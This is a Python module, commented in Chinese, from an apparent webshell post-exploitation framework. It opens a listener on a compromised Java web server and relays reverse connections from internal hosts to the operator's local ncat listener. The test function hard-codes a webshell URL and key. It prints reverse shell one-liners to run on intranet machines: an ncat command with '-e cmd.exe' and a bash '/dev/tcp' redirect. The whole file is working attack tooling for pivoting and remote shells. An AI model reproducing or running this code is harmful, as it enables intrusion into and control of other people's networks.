#!/usr/bin/env python3
"""
反连端口服务
实现本地端口监听，接收来自webshell反连的数据

工作原理：
1. 客户端指定webshell端要监听的端口
2. webshell在指定端口启动监听  
3. 内网机器连接到webshell的监听端口（反连）
4. 本地服务通过HTTP轮询获取反连数据
5. 本地服务可以发送数据到反连的内网机器

使用场景：
- 内网机器反弹shell
- 不出网环境下的反向通信
- 反向文件传输等
"""

import socket
import threading
import time
from .javaShell import JavaShell
from .javaPayload import javaPayload


class ReverseConnectService:
    """反连端口服务"""
    
    def __init__(self, shell: JavaShell,reverse_connect_class_name):
        self.shell = shell
        self.reverse_connect_class_name = reverse_connect_class_name
        self.active_listeners = {}  # {listen_id: listener_info}
        self.active_connections = {}  # {connection_id: connection_info}
        self.is_running = False
        
    
    def start_reverse_listener(self, listen_id, webshell_port, local_ip=None, local_port=None):
        """
        启动反连监听（仅在webshell端，需要手动创建本地监听）
        :param listen_id: 监听器标识符
        :param webshell_port: webshell端监听端口
        :param local_ip: 本地IP地址（可选，用于桥接连接）
        :param local_port: 本地端口（可选，用于桥接连接）
        :return: 启动结果
        """
        try:

            # 检查监听器是否已存在
            if listen_id in self.active_listeners:
                print(f"[WARNING] 监听器已存在: {listen_id}")
                return False
            
            print(f"[INFO] 启动反连监听: {listen_id} on webshell port {webshell_port}")
            
            # 在webshell端启动监听
            success = self.shell.start_reverse_listener(
                listen_id, 
                webshell_port,
                self.reverse_connect_class_name
            )
            
            if not success:
                print(f"[ERROR] webshell端监听启动失败: {listen_id}")
                return False
            
            # 显示手动监听提示
            if local_ip and local_port:
                print(f"ℹ️ 需要手动在 {local_ip}:{local_port} 启动监听")
                if local_ip == "127.0.0.1":
                    print(f"   建议命令: ncat -lvp {local_port}")
                    print(f"   或者: nc -lvp {local_port}")
                else:
                    print(f"   建议命令: ncat -lvp {local_port} (在 {local_ip} 上运行)")
                    print(f"   或者: nc -lvp {local_port} (在 {local_ip} 上运行)")
            
            # 保存监听器信息
            listener_info = {
                'listen_id': listen_id,
                'webshell_port': webshell_port,
                'local_ip': local_ip,
                'local_port': local_port,
                'is_active': True,
                'created_time': time.time(),
                'connection_count': 0
            }
            
            self.active_listeners[listen_id] = listener_info
            
            # 启动监听管理线程
            monitor_thread = threading.Thread(
                target=self._monitor_reverse_listener,
                args=(listener_info,),
                daemon=True
            )
            monitor_thread.start()
            
            print(f"✓ 反连监听创建成功: {listen_id}")
            return True
            
        except Exception as e:
            print(f"[ERROR] 启动反连监听异常: {e}")
            return False
    
    def _monitor_reverse_listener(self, listener_info):
        """监控反连监听器"""
        listen_id = listener_info['listen_id']
        
        print(f"[INFO] 开始监控反连监听器: {listen_id}")
        
        try:
            while listener_info['is_active']:
                try:
                    # 检查新的反连连接
                    new_connection = self.shell.check_reverse_connections(
                        listen_id,
                        self.reverse_connect_class_name
                    )
                    
                    if new_connection:
                        connection_id = new_connection['connection_id']
                        client_addr = new_connection['client_addr']
                        
                        print(f"[INFO] 发现新反连: {connection_id} from {client_addr}")
                        
                        # 保存连接信息
                        connection_info = {
                            'connection_id': connection_id,
                            'client_addr': client_addr,
                            'listen_id': listen_id,
                            'listener_info': listener_info,
                            'is_active': True,
                            'created_time': time.time(),
                            'local_client': None
                        }
                        
                        self.active_connections[connection_id] = connection_info
                        listener_info['connection_count'] += 1
                        
                        # 启动连接处理线程
                        conn_thread = threading.Thread(
                            target=self._handle_reverse_connection,
                            args=(connection_info,),
                            daemon=True
                        )
                        conn_thread.start()
                    
                    # 短暂等待后继续检查
                    time.sleep(0.5)
                    
                except Exception as e:
                    if listener_info['is_active']:
                        print(f"[ERROR] 监控反连异常: {e}")
                    time.sleep(1)
                    
        except Exception as e:
            print(f"[ERROR] 反连监控异常: {e}")
        finally:
            print(f"[INFO] 反连监听监控结束: {listen_id}")
    

    
    def _handle_reverse_connection(self, connection_info):
        """处理反连连接"""
        connection_id = connection_info['connection_id']
        client_addr = connection_info['client_addr']
        
        try:
            print(f"[DEBUG] 处理反连连接: {connection_id} from {client_addr}")
            
            # 启动数据转发线程
            reverse_thread = threading.Thread(
                target=self._forward_reverse_to_local,
                args=(connection_info,),
                daemon=True
            )
            reverse_thread.start()
            
            # 等待线程结束
            reverse_thread.join()
            
        except Exception as e:
            print(f"[ERROR] 处理反连连接异常: {e}")
        finally:
            self._cleanup_reverse_connection(connection_info)

    def _forward_reverse_to_local(self, connection_info):
        """转发反连连接的数据到本地监听端口"""
        connection_id = connection_info['connection_id']
        client_addr = connection_info['client_addr']
        listener_info = connection_info['listener_info']
        local_ip = listener_info.get('local_ip')
        local_port = listener_info.get('local_port')
        
        try:
            print(f"[INFO] 开始处理反连连接转发: {connection_id}")
            
            # 如果没有配置本地IP和端口，则进入手动交互模式
            if not local_ip or not local_port:
                print(f"[INFO] 未配置本地桥接，启动手动交互模式: {connection_id}")
                self._manual_interaction_with_connection(connection_info)
                return
            
            # 尝试连接到本地监听端口
            print(f"[INFO] 尝试连接本地监听: {local_ip}:{local_port}")
            bridge_socket, success = self._establish_persistent_bridge(local_ip, local_port, connection_id)
            
            if not success or not bridge_socket:
                print(f"[ERROR] 无法连接到本地监听端口 {local_ip}:{local_port}")
                print(f"[INFO] 请确保已启动本地监听: ncat -lvp {local_port}")
                return
            
            # 保存本地连接
            connection_info['local_client'] = bridge_socket
            
            print(f"[INFO] 建立双向数据转发: {connection_id} <-> {local_ip}:{local_port}")
            
            # 启动双向数据转发
            local_to_reverse_thread = threading.Thread(
                target=self._bridge_local_to_reverse,
                args=(bridge_socket, connection_id, listener_info),
                daemon=True
            )
            
            reverse_to_local_thread = threading.Thread(
                target=self._bridge_reverse_to_local,
                args=(bridge_socket, connection_id, listener_info),
                daemon=True
            )
            
            local_to_reverse_thread.start()
            reverse_to_local_thread.start()
            
            # 等待任一线程结束
            while (local_to_reverse_thread.is_alive() and 
                   reverse_to_local_thread.is_alive() and
                   listener_info['is_active']):
                time.sleep(0.1)
            
            print(f"[INFO] 数据转发结束: {connection_id}")
            
        except Exception as e:
            print(f"[ERROR] 反连连接转发异常: {e}")
            import traceback
            traceback.print_exc()
        finally:
            # 清理资源
            if 'local_client' in connection_info and connection_info['local_client']:
                try:
                    connection_info['local_client'].close()
                except:
                    pass
            print(f"[INFO] 反连连接处理结束: {connection_id}")

    def _manual_interaction_with_connection(self, connection_info):
        """与单个反连连接进行手动交互"""
        connection_id = connection_info['connection_id']
        client_addr = connection_info['client_addr']
        listener_info = connection_info['listener_info']
        
        print(f"📱 手动交互模式 - 反连: {connection_id} from {client_addr}")
        print("💡 提示: 这是一个交互式会话")
        print("   - 输入命令后按回车发送")
        print("   - 输入 'exit' 或 'quit' 退出")
        print("   - Ctrl+C 强制退出")
        print("-" * 50)
        
        try:
            connection_buffer = ""
            
            while listener_info['is_active']:
                try:
                    # 读取反连连接的数据
                    data = self.shell.read_reverse_connection(
                        connection_id,
                        self.reverse_connect_class_name
                    )
                    
                    if data is None:
                        print(f"\n[INFO] 反连连接断开: {connection_id}")
                        break
                    elif len(data) > 0:
                        # 显示接收到的数据
                        self._display_reverse_data(connection_id, data, connection_buffer)
                    else:
                        # 没有数据，短暂等待
                        time.sleep(0.1)
                        
                except KeyboardInterrupt:
                    print(f"\n[INFO] 用户中断交互: {connection_id}")
                    break
                except Exception as e:
                    if "connection closed" in str(e).lower():
                        print(f"\n[INFO] 反连连接关闭: {connection_id}")
                        break
                    else:
                        print(f"[ERROR] 交互异常: {e}")
                        time.sleep(1)
                        
        except Exception as e:
            print(f"[ERROR] 手动交互异常: {e}")
        finally:
            print(f"[INFO] 手动交互结束: {connection_id}")
    

    
    def _cleanup_reverse_connection(self, connection_info):
        """清理反连连接资源"""
        connection_id = connection_info['connection_id']
        
        try:
            print(f"[DEBUG] 清理反连连接: {connection_id}")
            
            # 关闭本地连接
            local_client = connection_info['local_client']
            if local_client:
                try:
                    local_client.close()
                except:
                    pass
                connection_info['local_client'] = None
            
            # 关闭webshell端连接
            try:
                self.shell.close_reverse_connection(
                    connection_id,
                    self.reverse_connect_class_name
                )
            except:
                pass
            
            # 从活跃连接中移除
            if connection_id in self.active_connections:
                del self.active_connections[connection_id]
                
        except Exception as e:
            print(f"[ERROR] 清理反连连接异常: {e}")
    
    def stop_reverse_listener(self, listen_id):
        """停止反连监听"""
        try:
            if listen_id not in self.active_listeners:
                print(f"[WARNING] 反连监听器不存在: {listen_id}")
                return False
            
            listener_info = self.active_listeners[listen_id]
            
            print(f"[INFO] 停止反连监听: {listen_id}")
            
            # 标记为非活跃
            listener_info['is_active'] = False
            
            # 停止webshell端监听
            try:
                self.shell.stop_reverse_listener(listen_id, self.reverse_connect_class_name)
            except:
                pass
            
            # 清理所有相关连接
            connections_to_close = [
                conn_id for conn_id, conn_info in self.active_connections.items()
                if conn_info['listen_id'] == listen_id
            ]
            
            for conn_id in connections_to_close:
                if conn_id in self.active_connections:
                    self._cleanup_reverse_connection(self.active_connections[conn_id])
            
            # 从活跃监听器中移除
            del self.active_listeners[listen_id]
            
            print(f"✓ 反连监听停止成功: {listen_id}")
            return True
            
        except Exception as e:
            print(f"[ERROR] 停止反连监听异常: {e}")
            return False
    
    def send_to_reverse_connection(self, connection_id, data):
        """发送数据到指定反连连接"""
        try:
            if connection_id not in self.active_connections:
                print(f"[ERROR] 反连连接不存在: {connection_id}")
                return False
            
            success = self.shell.write_reverse_connection(
                connection_id,
                data,
                self.reverse_connect_class_name
            )
            
            return success
            
            
        except Exception as e:
            print(f"[ERROR] 发送到反连连接异常: {e}")
            return False
    
    def start_manual_interaction(self, listen_id, enable_local_bridge=True):
        """
        启动手动交互模式（需要手动创建本地监听）
        用户需要手动在指定IP和端口启动监听工具
        :param enable_local_bridge: 是否启用本地端口桥接（连接用户手动启动的监听）
        """
        try:
            if listen_id not in self.active_listeners:
                print(f"[ERROR] 监听器不存在: {listen_id}")
                return False
            
            listener_info = self.active_listeners[listen_id]
            local_ip = listener_info.get('local_ip')
            local_port = listener_info.get('local_port')
            
            print(f"🔧 手动交互模式启动: {listen_id}")
            if local_ip and local_port:
                print(f"📝 请在指定地址启动本地监听:")
                if local_ip == "127.0.0.1":
                    print(f"   ncat -lvp {local_port}")
                    print(f"   或者: nc -lvp {local_port}")
                    print(f"   或者: socat TCP-LISTEN:{local_port},fork,reuseaddr -")
                else:
                    print(f"   在 {local_ip} 上运行: ncat -lvp {local_port}")
                    print(f"   或者: nc -lvp {local_port}")
                    print(f"   或者: socat TCP-LISTEN:{local_port},fork,reuseaddr -")
                
                if enable_local_bridge:
                    print(f"🌉 启用本地端口桥接模式，将自动连接到 {local_ip}:{local_port}")
                else:
                    print(f"📺 仅显示模式，数据将只在控制台显示")
            
            print(f"⏳ 等待反连连接...")
            
            # 保存桥接模式设置
            listener_info['enable_local_bridge'] = enable_local_bridge
            
            # 启动交互监控线程
            interaction_thread = threading.Thread(
                target=self._manual_interaction_loop,
                args=(listener_info,),
                daemon=True
            )
            interaction_thread.start()
            
            return True
            
        except Exception as e:
            print(f"[ERROR] 启动手动交互异常: {e}")
            return False
    
    def _manual_interaction_loop(self, listener_info):
        """手动交互循环"""
        listen_id = listener_info['listen_id']
        local_ip = listener_info.get('local_ip')
        local_port = listener_info.get('local_port')
        enable_local_bridge = listener_info.get('enable_local_bridge', True)
        
        print(f"[INFO] 开始手动交互监控: {listen_id}")
        
        current_connection = None
        connection_buffer = {}  # 存储每个连接的数据缓冲
        bridge_socket = None  # 本地桥接socket
        bridge_connected = False
        bridge_threads = []  # 桥接线程列表
        
        try:
            while listener_info['is_active']:
                # 检查新的反连连接
                if not current_connection:
                    new_conn = self.shell.check_reverse_connections(
                        listen_id,
                        self.reverse_connect_class_name
                    )
                    
                    if new_conn:
                        current_connection = new_conn['connection_id']
                        client_addr = new_conn['client_addr']
                        print(f"\n🎉 新反连连接: {current_connection}")
                        print(f"📍 来源地址: {client_addr}")
                        
                        # 初始化连接缓冲
                        connection_buffer[current_connection] = b""
                        
                        # 如果启用桥接且有本地IP和端口，建立持久桥接连接
                        if enable_local_bridge and local_ip and local_port:
                            bridge_socket, bridge_connected = self._establish_persistent_bridge(local_ip, local_port, current_connection)
                            if bridge_connected and bridge_socket:
                                # 启动双向数据转发线程
                                # 线程1：从本地ncat读取，转发到反连
                                local_to_reverse_thread = threading.Thread(
                                    target=self._bridge_local_to_reverse,
                                    args=(bridge_socket, current_connection, listener_info),
                                    daemon=True
                                )
                                # 线程2：从反连读取，转发到本地ncat  
                                reverse_to_local_thread = threading.Thread(
                                    target=self._bridge_reverse_to_local,
                                    args=(bridge_socket, current_connection, listener_info),
                                    daemon=True
                                )
                                
                                local_to_reverse_thread.start()
                                reverse_to_local_thread.start()
                                bridge_threads = [local_to_reverse_thread, reverse_to_local_thread]
                                
                                print(f"🌉 桥接已建立: {current_connection} <-> {local_ip}:{local_port}")
                        elif local_ip and local_port:
                            print(f"💡 现在可以在 {local_ip}:{local_port} 与反连机器交互")
                            if local_ip == "127.0.0.1":
                                print(f"   例如: nc 127.0.0.1 {local_port}")
                            else:
                                print(f"   例如: nc {local_ip} {local_port}")
                
                # 如果没有启用桥接或桥接失败，读取反连数据并显示
                if current_connection and (not enable_local_bridge or not bridge_connected):
                    try:
                        data = self.shell.read_reverse_connection(
                            current_connection,
                            self.reverse_connect_class_name
                        )
                        
                        if data is None:
                            print(f"\n💔 反连断开: {current_connection}")
                            if current_connection in connection_buffer:
                                del connection_buffer[current_connection]
                            current_connection = None
                        elif len(data) > 0:
                            # 显示在控制台
                            self._display_reverse_data(current_connection, data, connection_buffer)
                    
                    except Exception as e:
                        if "connection closed" in str(e).lower():
                            print(f"\n💔 反连断开: {current_connection}")
                            if current_connection in connection_buffer:
                                del connection_buffer[current_connection]
                            current_connection = None
                        else:
                            print(f"\n❌ 读取反连数据异常: {e}")
                
                # 检查桥接线程状态
                if bridge_connected and bridge_threads:
                    # 检查桥接线程是否都还活着
                    active_threads = [t for t in bridge_threads if t.is_alive()]
                    if len(active_threads) < len(bridge_threads):
                        print(f"\n💔 桥接连接断开: {current_connection}")
                        # 清理资源
                        if bridge_socket:
                            try:
                                bridge_socket.close()
                            except:
                                pass
                        current_connection = None
                        bridge_connected = False
                        bridge_threads = []
                        bridge_socket = None
                
                # 短暂等待
                time.sleep(0.1)
                
        except Exception as e:
            print(f"[ERROR] 手动交互异常: {e}")
        finally:
            # 清理资源
            if bridge_socket:
                try:
                    bridge_socket.close()
                except:
                    pass
            print(f"[INFO] 手动交互监控结束: {listen_id}")
    
    def _establish_persistent_bridge(self, local_ip, local_port, connection_id):
        """建立持久的桥接连接"""
        try:
            print(f"🌉 建立持久桥接连接: {local_ip}:{local_port}")
            
            # 尝试连接5次，每次间隔1秒
            for attempt in range(5):
                try:
                    bridge_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    bridge_socket.settimeout(10)  # 设置较长超时
                    bridge_socket.connect((local_ip, local_port))
                    bridge_socket.settimeout(None)  # 连接后移除超时
                    
                    print(f"✅ 持久桥接连接建立成功: {local_ip}:{local_port}")
                    return bridge_socket, True
                    
                except Exception as e:
                    if attempt < 4:
                        print(f"⏳ 本地端口连接失败，重试中... ({attempt+1}/5): {e}")
                        time.sleep(1)
                    else:
                        print(f"❌ {local_ip}:{local_port} 连接失败: {e}")
                        if local_ip == "127.0.0.1":
                            print(f"   请确保已启动监听: ncat -lvp {local_port}")
                        else:
                            print(f"   请确保在 {local_ip} 上已启动监听: ncat -lvp {local_port}")
                        return None, False
                        
            return None, False
            
        except Exception as e:
            print(f"❌ 建立桥接连接异常: {e}")
            return None, False
    
    def _bridge_local_to_reverse(self, bridge_socket, connection_id, listener_info):
        """桥接：从本地ncat读取数据，转发到反连连接"""
        try:
            print(f"[INFO] 启动本地->反连数据转发: {connection_id}")
            
            while listener_info['is_active']:
                try:
                    # 从本地socket读取数据
                    bridge_socket.settimeout(0.1)  # 短超时用于检查循环条件
                    data = bridge_socket.recv(4096)
                    
                    if not data:
                        print(f"[INFO] 本地连接关闭: {connection_id}")
                        break
                    
                    # 转发到反连连接
                    success = self.shell.write_reverse_connection(
                        connection_id,
                        data,
                        self.reverse_connect_class_name
                    )
                    
                    if success:
                        print(f"[LOCAL->REVERSE] 转发 {len(data)} 字节")
                    else:
                        print(f"[ERROR] 本地->反连转发失败")
                        break
                        
                except socket.timeout:
                    # 正常超时，继续循环
                    continue
                except socket.error as e:
                    print(f"[INFO] 本地socket连接断开: {e}")
                    break
                except Exception as e:
                    print(f"[ERROR] 本地->反连转发异常: {e}")
                    break
                    
        except Exception as e:
            print(f"[ERROR] 本地->反连桥接异常: {e}")
        finally:
            print(f"[INFO] 本地->反连数据转发结束: {connection_id}")
    
    def _bridge_reverse_to_local(self, bridge_socket, connection_id, listener_info):
        """桥接：从反连连接读取数据，转发到本地ncat"""
        try:
            print(f"[INFO] 启动反连->本地数据转发: {connection_id}")
            
            while listener_info['is_active']:
                try:
                    # 从反连连接读取数据
                    data = self.shell.read_reverse_connection(
                        connection_id,
                        self.reverse_connect_class_name
                    )
                    
                    if data is None:
                        print(f"[INFO] 反连连接关闭: {connection_id}")
                        break
                    elif len(data) > 0:
                        # 转发到本地socket
                        try:
                            bridge_socket.send(data)
                            print(f"[REVERSE->LOCAL] 转发 {len(data)} 字节")
                        except socket.error as e:
                            print(f"[INFO] 本地socket写入失败: {e}")
                            break
                    else:
                        # 没有数据，短暂等待
                        time.sleep(0.01)
                        
                except Exception as e:
                    if "connection closed" in str(e).lower():
                        print(f"[INFO] 反连连接断开: {connection_id}")
                        break
                    else:
                        print(f"[ERROR] 反连->本地转发异常: {e}")
                        time.sleep(0.1)
                        
        except Exception as e:
            print(f"[ERROR] 反连->本地桥接异常: {e}")
        finally:
            print(f"[INFO] 反连->本地数据转发结束: {connection_id}")
    

    
    def _display_reverse_data(self, connection_id, data, connection_buffer):
        """在控制台显示反连数据"""
        # 累积数据到缓冲区
        connection_buffer[connection_id] += data
        
        # 尝试解析完整的行或命令输出
        buffer_data = connection_buffer[connection_id]
        try:
            text_data = buffer_data.decode('utf-8', errors='ignore')
            
            # 如果包含换行符，显示完整行
            if '\n' in text_data:
                lines = text_data.split('\n')
                # 显示完整的行
                for line in lines[:-1]:
                    if line.strip():
                        print(f"[{connection_id}] {line}")
                
                # 保留最后的不完整行
                if lines[-1]:
                    connection_buffer[connection_id] = lines[-1].encode('utf-8')
                else:
                    connection_buffer[connection_id] = b""
            else:
                # 如果数据较少且没有换行符，暂时缓冲
                if len(buffer_data) > 1024:  # 如果缓冲区太大，强制输出
                    print(f"[{connection_id}] {text_data}")
                    connection_buffer[connection_id] = b""
                    
        except Exception as decode_error:
            # 二进制数据，直接显示
            print(f"[{connection_id}] Binary data: {data[:50].hex()}...")
            connection_buffer[connection_id] = b""
    
    def get_reverse_status(self):
        """获取反连状态"""
        try:
            status = {
                'active_listeners': len(self.active_listeners),
                'active_connections': len(self.active_connections),
                'listeners': [],
                'connections': []
            }
            
            # 监听器状态
            for listen_id, listener_info in self.active_listeners.items():
                listener_status = {
                    'listen_id': listen_id,
                    'webshell_port': listener_info['webshell_port'],
                    'local_ip': listener_info.get('local_ip'),
                    'local_port': listener_info.get('local_port'),
                    'connection_count': listener_info['connection_count'],
                    'is_active': listener_info['is_active'],
                    'uptime': time.time() - listener_info['created_time']
                }
                status['listeners'].append(listener_status)
            
            # 连接状态
            for connection_id, connection_info in self.active_connections.items():
                connection_status = {
                    'connection_id': connection_id,
                    'client_addr': connection_info['client_addr'],
                    'listen_id': connection_info['listen_id'],
                    'has_local_client': connection_info['local_client'] is not None,
                    'is_active': connection_info['is_active'],
                    'uptime': time.time() - connection_info['created_time']
                }
                status['connections'].append(connection_status)
            
            # 获取webshell端状态
            if self.reverse_connect_class_name:
                webshell_status = self.shell.get_reverse_connect_status(self.reverse_connect_class_name)
                if webshell_status:
                    status['webshell_status'] = webshell_status
            
            return status
            
        except Exception as e:
            print(f"[ERROR] 获取反连状态异常: {e}")
            return {'error': str(e)}
    
    def close_all_reverse_connects(self):
        """关闭所有反连监听器和连接"""
        try:
            print("[INFO] 关闭所有反连监听器和连接...")
            
            listen_ids = list(self.active_listeners.keys())
            for listen_id in listen_ids:
                self.stop_reverse_listener(listen_id)
            
            # 清理webshell端所有连接
            if self.reverse_connect_class_name:
                self.shell.clear_all_reverse_connects(self.reverse_connect_class_name)
            
            print("✓ 所有反连已关闭")
            return True
            
        except Exception as e:
            print(f"[ERROR] 关闭所有反连异常: {e}")
            return False


# 使用示例和测试代码
def test_reverse_connect():
    """测试反连功能"""
    try:
        print("=" * 70)
        print("🔧 测试反连端口功能")
        print("=" * 70)
        
        # webshell连接配置
        WEBSHELL_CONFIG = {
            "url": "http://172.26.36.30:8080/webshell/linux_webshell.jsp",
            "param_name": "pass",
            "secret_key": "rebeyond"
        }
        
        print("🔗 正在连接webshell...")
        
        # 初始化webshell连接
        shell = JavaShell(
            url=WEBSHELL_CONFIG["url"],
            param_name=WEBSHELL_CONFIG["param_name"], 
            secret_key=WEBSHELL_CONFIG["secret_key"]
        )
        
        # 初始化payload
        shell.init_payload()
        
        # 测试webshell连接
        if not shell.test():
            print("❌ Webshell连接测试失败！")
            return False
        
        print("✅ Webshell连接测试成功!")
        
        # 创建反连服务
        print("🔧 正在初始化反连服务...")
        payload = javaPayload()
        classInfo = payload.getPayload(
            class_name="ReverseConnect", 
            obfuscation_method='none'
        )
        
        if not shell.include(classInfo):
            print("❌ 加载ReverseConnect类失败")
            return False
        reverse_service = ReverseConnectService(shell,reverse_connect_class_name=classInfo["classname"])
        
        # 创建反连监听：webshell 4444端口 -> 本地 8888端口
        listen_id = "test_reverse_shell"
        webshell_port = 4444
        local_port = 8888
        
        print(f"🌐 创建反连监听: webshell:{webshell_port} -> local:{local_port}")
        
        # 首先创建反连监听器（仅在webshell端）
        if not reverse_service.start_reverse_listener(listen_id, webshell_port, "127.0.0.1", local_port):
            print("❌ 创建反连监听失败！")
            return False
            
        # 然后启动手动交互模式
        if not reverse_service.start_manual_interaction(listen_id, enable_local_bridge=True):
            print("❌ 启动手动交互模式失败！")
            return False
        
        print("✅ 反连监听创建成功!")
        
        # 显示状态信息
        print("\n" + "=" * 70)
        print("📊 反连状态")
        print("=" * 70)
        status = reverse_service.get_reverse_status()
        print(f"活跃监听器数: {status['active_listeners']}")
        print(f"活跃连接数: {status['active_connections']}")
        
        for listener in status['listeners']:
            print(f"监听器: {listener['listen_id']}")
            print(f"  webshell端口: {listener['webshell_port']}")
            print(f"  本地端口: {listener['local_port']}")
            print(f"  连接数: {listener['connection_count']}")
        
        print("\n💡 使用说明:")
        print(f"1. 反连监听已建立: webshell:{webshell_port} -> local:{local_port}")
        print(f"2. 在内网机器上执行反连命令，例如:")
        print(f"   ncat <webshell_ip> {webshell_port} -e cmd.exe")
        print(f"   bash -i >& /dev/tcp/<webshell_ip>/{webshell_port} 0>&1")
        print(f"3. 然后可以通过本地端口 {local_port} 与反连的机器交互")
        print(f"4. 或者直接在控制台看到反连数据")
        print("5. 按Ctrl+C停止服务")
        
        # 保持服务运行
        try:
            while True:
                time.sleep(5)
                # 定期显示状态
                status = reverse_service.get_reverse_status()
                current_time = time.strftime('%H:%M:%S')
                print(f"[{current_time}] 监听器: {status['active_listeners']}, 连接: {status['active_connections']}")
        except KeyboardInterrupt:
            print("\n[INFO] 收到停止信号")
        
        return True
        
    except Exception as e:
        print(f"❌ 测试异常: {e}")
        import traceback
        traceback.print_exc()
        return False
    finally:
        # 清理资源
        try:
            reverse_service.close_all_reverse_connects()
        except:
            pass
        print("\n👋 测试结束")


def main():
    """主函数"""
    print("反连端口服务")
    print("在webshell端监听端口，等待内网机器反连")
    
    # 询问是否运行测试
    try:
        choice = input("\n是否运行测试? (y/N): ").strip().lower()
        if choice == 'y':
            test_reverse_connect()
    except KeyboardInterrupt:
        print("\n[INFO] 已取消")


if __name__ == "__main__":
    main()
